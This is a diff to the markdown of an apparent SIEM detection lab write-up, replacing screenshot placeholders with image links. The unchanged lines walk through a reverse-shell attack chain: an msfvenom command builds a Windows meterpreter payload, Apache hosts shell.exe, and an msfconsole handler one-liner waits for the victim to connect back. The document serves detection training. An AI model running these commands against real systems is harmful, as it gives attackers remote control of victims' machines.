@@ -10,7 +10,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali-IP> LPORT=4444 -f exe -o
 
 Generates a reverse shell payload for Windows.
 
-(Add screenshot: payload creation)
+![msfvenom](https://github.com/akshaysapkal-cyber/Wazuh-SIEM-Lab-Detection/blob/main/Screenshots/attack/msfvenom.png?raw=true)
 
 ## Step 2: Move Payload to Web Directory
 
@@ -30,15 +30,13 @@ sudo service apache2 start
 ```
 Starts a web server to host the payload.
 
-(Add screenshot: apache running)
-
 ## Step 4: Start Metasploit Listener
 ```bash
 msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <Kali ip>; set LPORT 4444; run"
 ```
 Prepares listener to receive reverse connection.
 
-(Add screenshot: handler running)
+![msfconsole](https://github.com/akshaysapkal-cyber/Wazuh-SIEM-Lab-Detection/blob/main/Screenshots/attack/msfconsole.png?raw=true)
 
 ## Step 5: Download and Execute Payload on Windows
 Open browser on Windows and visit:
@@ -47,13 +45,13 @@ Open browser on Windows and visit:
 Download and run the `shell.exe` on the windows system.
 Executes the reverse shell payload and initiates connection.
 
-(Add screenshot: download + execution)
+![payload windows](https://github.com/akshaysapkal-cyber/Wazuh-SIEM-Lab-Detection/blob/main/Screenshots/attack/windows%20download%20shell.png?raw=true)
 
 ## Step 6: Gain Access on Kali
 Once payload executed in target machine, a Meterpreter session is opened.
 Provides remote access to the target system.
 
-(Add screenshot: meterpreter session)
+![meterpreter](https://github.com/akshaysapkal-cyber/Wazuh-SIEM-Lab-Detection/blob/main/Screenshots/attack/meterpreter.png?raw=true)
 
 ## What Happened
 - A malicious payload was created and delivered to the target system.
